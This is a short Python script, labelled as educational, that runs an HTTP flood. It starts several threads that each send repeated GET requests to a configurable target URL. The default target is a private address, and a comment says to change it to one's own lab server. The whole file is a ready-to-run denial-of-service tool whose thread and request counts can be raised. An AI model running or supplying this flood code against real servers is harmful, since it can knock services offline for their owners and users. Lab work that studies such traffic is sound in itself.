import requests
import threading

def http_flood(target_url="http://192.168.1.100", threads=5, count=50):
    print(f"[EDU] Simulating HTTP Flood on {target_url}")
    def send_request():
        for _ in range(count):
            try: requests.get(target_url)
            except: pass
    for _ in range(threads): threading.Thread(target=send_request).start()

if __name__ == "__main__":
    http_flood()  # CHANGE URL TO YOUR LAB SERVER